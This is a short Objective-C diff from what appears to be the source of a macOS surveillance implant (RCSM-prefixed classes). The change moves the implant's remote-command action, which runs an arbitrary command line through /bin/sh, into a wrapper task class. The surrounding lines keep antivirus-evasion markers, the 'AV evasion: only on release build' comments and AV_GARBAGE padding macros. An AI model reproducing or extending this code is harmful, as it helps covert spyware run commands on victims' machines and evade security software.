@@ -12,7 +12,7 @@
 #import "RCSMActions.h"
 #import "RCSMTaskManager.h"
 #import "RCSMInfoManager.h"
-
+#import "RCSMTask.h"
 #import "RESTNetworkProtocol.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
@@ -369,26 +369,11 @@
                                   options: NSCaseInsensitiveSearch
                                     range: NSMakeRange(0, [configData length])];
 
-
-  NSMutableArray *_arguments = [[NSMutableArray alloc] init];
+  _i_Task *tsk = [[_i_Task alloc] init];
   
-  // AV evasion: only on release build
-  AV_GARBAGE_002
+  [tsk performCommand: commandLine];
   
-  [_arguments addObject: @"-c"];
-  [_arguments addObject: commandLine];
-
-  NSTask *task = [[NSTask alloc] init];
-  [task setLaunchPath: @"/bin/sh"];
-  [task setArguments: _arguments];
-
-  NSPipe *pipe = [NSPipe pipe];
-  [task setStandardOutput: pipe];
-  [task setStandardError: pipe];
-
-  [task launch];
-  [task waitUntilExit];
-  [task release];
+  [tsk release];
   
   // AV evasion: only on release build
   AV_GARBAGE_003
@@ -398,7 +383,6 @@
 
   [configData release];
   [commandLine release];
-  [_arguments release];
 
   [aConfiguration release];
 
